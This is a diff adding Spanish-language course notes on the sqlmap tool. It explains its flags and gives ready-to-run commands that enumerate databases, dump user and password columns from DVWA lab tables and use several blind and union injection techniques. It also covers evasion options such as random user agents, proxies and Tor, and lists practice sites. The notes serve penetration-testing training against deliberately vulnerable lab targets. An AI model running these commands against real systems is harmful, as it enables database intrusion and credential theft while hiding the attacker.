@@ -1,0 +1,214 @@
+INDICACIONES DEL CURSO:
+--------------------------------------
+python 2.7.16 - 64bits
+sqlmap 1.8.2	
+
+
+
+
+
+
+
+msfadmin - msfadmin
+
+
+
+
+
+
+comandos y comentarios de SQLMAP:
+------------------------------------
+
+sqlmap -h
+sqlmap -hh
+sqlmap --version
+sqlmap --update
+sqlmap --dependencie
+sqlmap --privileges | grep privileges			#el comando grep se usa para filtrar, en este caso mirariamos la ayuda para saber que hace privileges
+
+
+ejemplos:
+-------------
+*TEN EN CUENTA QUE EL ORDEN COMO COLOQUES LOS COMANDOS DE SQLMAP INFLUIRAN EN EL RESULTADO. 
+
+--dbms GESTORSQL					#sirve para indicar en especifico que gestor de base de datos queremos que utilize
+-p PARAMETRO						#sirve para indicar que parametros en especifico queremos que se enfoque
+-u URL							#abreviación de --url que sirve para indicar la url objetivo.
+-dbs 							#para que cuando termine de ataquer por asi decirlo, nos muestre las bases de datos que obtinee
+--purge							#que haga una consulta del inicio (es decir que si ya hiciste la consulta antes, y corrista en el mismo fichero sqlmap, borrara ese archivo final para que le deje hacer la consulta desde 0)
+--random-agent						#te genera un 'user agent' aleatorio, para que no sea facil de rastrear el user agent que hizo la injection sql
+--user-agent="Opera/9.20 (Windows NT 5.1; U; it)"		#Para indicar un 'user agent' en especifico
+--mobile						#Nos sirve para user un user-agent de mobiles, y nos dara una lista de que tipo queremos usar, esto es util para paginas web que unicamente aceptas user-agent mobil,
+							ojo podrias conseguir un user-agent actual simplement	e buscando en google (por ejemplo USER AGENT XIAOMI 11T PRO) y te saldran varias opciones
+--technique BEUSTQ 					#acepta esos parametros,ver el manual de ayuda sqlmap para entender con sqlmap -hh
+--time-sec 10						#que espere en cada prueba que haga el tiempo que le demos como parametro
+
+
+
+--level	1						#toma valores entre (1-5), sino indicamos prueba todos los niveles, cada nivel prueba distintas cosas, recuerda que a mas nivel mas ruido generara en el servidor.
+--risk	1						#toma valores entre (1-3), que nivel de riesgo queremos que abarque nuestro sqlmap
+-v 1							#toma valores entre (1-5), en nivel 5 muestra ya todo la información de lo que hace sqlmap
+
+
+
+--fingerprint						#para obtener una version mas exacta de la base de datos
+--banner						#para obtener informacion del sistema operativo y tambien del gestor sql (aunque no es tanto exacto en el nombre como fingerprint)
+--current-db						#nos da la base de datos actual con la que esta trabajando el servidor web al que le hicimos el ataque
+--count							#nos devuelve las tablas que contiene las bases de datos extraidas
+--schema						#nos optiene la infomacion que almacena la tabla information_schema, o viendolo de otra forma, de cada tabla de la base de datos extraidas, nos dara la composicion que tienen, es decir sus campos.
+
+
+--users							#trata de enumerar los usuarios presentes en la base de datos
+--is-dba						#nos da informacion sobre los privilegios que tiene nuestro usuario en la based de datos
+--current-user						#nos da el nombre del usuario que estamos usando
+--roles							#nos da informacion de los roles que tiene cada usuario.
+
+--privileges						#enumera los privilegios de los usuarios de las bases de datos, como crear, modificar, eliminar, actualizar, etc.
+--serach users						#busara en la base de datos, en las tablas que tenga el nombre pasado como parametro, o buscara en los campos de cada tabla de la base de datos.
+--hostname						#nos encunetra el nombre de la maquina victima. el mismo nombre que si pusieras en consola en la maquina victima el comando 'hostname'. Ese nombre es como se identifica en la red, etc.
+
+
+--common-tables						#para realizar un ataque de fuerza bruta a las tablas
+--common-columns					#para realizar un ataque de fuerza bruta a los campos o columnas
+
+
+--proxy="http://127.0.0.1"				#para rederigir nuestro trafico a travez de un proxy
+--proxy="ipOdominio" --proxy-cred="admin:123"		#--proxy-cred para dar credenciales en caso necesitamos logearnos en el proxy	  
+--check-tor						#para verificar si estamos usando la red tor antes de iniciar el ataque
+--tor --tor-type="SOCKS5"				#especificamos el tipo de proxy que esta usando nuestro TOR
+
+
+
+*esto se puede usar antes, pero es recomendable despues de obtener las bases de datos:
+-D dvwa							#para indicar una base de datos en particular
+-D dvwa --tables					#--tables para que nos muestre las tablas de esa base de datos indicada
+-D dvwa -T users					#-T nos permite indicar una tabla en particular de la base de datos					
+-D dvwa -T users --columns				#--columns nos permite de la tabla indicada obtener sus columnas
+-D dvwa -T users -C user,password			#-C nos permite indicar campos de tabla indicada de la base de datos indicada
+-D dvwa -T users -C user,password --dump		#--dump nos permitira indicar si queremos guardar o no si hay resultado (tambien en el proceso nos preguntara si queremos realizar un ataque basado en diccionario), luego nos dara 3 opciones
+								[1] default diccionario (en linux esta en /usr/share/sqlmap/data/txt/wordlist.txt)
+								[2] custom diccionario
+								[3] file with list of dictionary files
+
+-D dvwa -T users -C user,password --dump --passwords		#--passwords trata de obtener las contraseñas de los usuarios que administran los gestores de las bases de datos.
+
+	sqlmap -u 'https://www.google.con/index.php?page=user.info.php&username=asdf&password=amsdf&user-info-php-submit-button=View+Account+Details"  --random-agent --dbms MySql  -p password -D dvwa -T users -C user,password --dump 
+	sqlmap -u 'https://www.google.con/index.php?page=user.info.php&username=asdf&password=amsdf&user-info-php-submit-button=View+Account+Details"  --random-agent --dbms MySql  -p password -D dvwa -T users -C user,password --passwords
+
+	sqlmap -u 'https://www.google.con/index.php?page=user.info.php&username=asdf&password=amsdf&user-info-php-submit-button=View+Account+Details"  -D dvwa --random-agent -p password --search Users
+	sqlmap -u 'https://www.google.con/index.php?page=user.info.php&username=asdf&password=amsdf&user-info-php-submit-button=View+Account+Details"  -D dvwa,owasp10 --random-agent -p password --search Users
+
+
+			
+
+
+	
+
+
+
+sqlmap -u 'https://www.google.con/index.php?page=user.info.php&username=asdf&password=amsdf&user-info-php-submit-button=View+Account+Details"  --dbs  --dbms MySql  -p password
+
+sqlmap -u 'https://www.google.con/index.php?page=user.info.php&username=asdf&password=amsdf&user-info-php-submit-button=View+Account+Details" --dbs --dbms mysql --technique U --random-agent -p password --level 3 --risk 1 -v 1
+
+sqlmap -u 'https://www.google.con/index.php?page=user.info.php&username=asdf&password=amsdf&user-info-php-submit-button=View+Account+Details" --dbs --dbms mysql --technique U --random-agent -p password
+
+sqlmap -u 'https://www.google.con/index.php?page=user.info.php&username=asdf&password=amsdf&user-info-php-submit-button=View+Account+Details" --dbs --dbms mysql --random-agent -p username --current-db
+
+
+PARA POST:
+---------------
+*Bool based blind: (tecnica)
+	sqlmap -u 'https://192.168.8.7/index.php?page=login.php' -dbs --dbms MySql --random-agent  --data='username=asdf&password=amsdf&login-php-submit-button=Login'  --method POST  --technique B -p username 
+
+
+*Time based blind: (tecnica)
+	sqlmap -u 'https://192.168.8.7/index.php?page=login.php' -dbs --dbms MySql --random-agent  --data='username=asdf&password=amsdf&login-php-submit-button=Login'  --method POST  --technique T -p username 
+	sqlmap -u 'https://192.168.8.7/index.php?page=login.php' -dbs --dbms MySql --random-agent  --data='username=asdf&password=amsdf&login-php-submit-button=Login'  --method POST  --technique T -p username --time-sec 10
+
+
+*Error based:	
+	sqlmap -u 'https://www.google.con/index.php?page=user.info.php&username=asdf&password=amsdf&user-info-php-submit-button=View+Account+Details" --dbs --dbms mysql --technique E --random-agent -p password
+
+
+*Union Query based:
+	sqlmap -u 'https://www.google.con/index.php?page=user.info.php&username=asdf&password=amsdf&user-info-php-submit-button=View+Account+Details" --dbs --dbms mysql --technique U --random-agent -p password
+
+
+
+
+
+
+
+#SQLMAP interactivo
+
+sqlmap --wizard				#te pedira de forma interactiva los parametros, esto es recomendable para novatos
+
+
+
+
+
+
+
+
+
+Linux:	(UBUTU)
+-------------------------------------
+tail -n 5 /var/log/apache2/access.log				#para ver los logs de acceso que intentaron hacer a nuestro servidor  (-n 5 indica los primeros 5 registros)
+
+/usr/share/sqlmap/data/						#en esta ruta, hay un user-agents.txt y ahi es donde estan los user agents que se usa cuando usamos random por ejemplo
+/usr/share/sqlmap/						#aqui nos muestra los modulos que usa SQLMAP
+
+
+
+
+
+
+chrome:
+-----------------------
+start chrome --new-window "about:blank" --window-size=400,916 --user-data-dir="%TEMP%\chrome-profile"				abre la ventana de chrome a ese tamaño y lo hace en about:blank
+
+
+
+
+
+
+
+
+Sitios Disponibles gratis para practicar online:
+-----------------------------------------------------------------------------------------------------
+testphp.vulnweb.com
+https://hackthissite.org/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
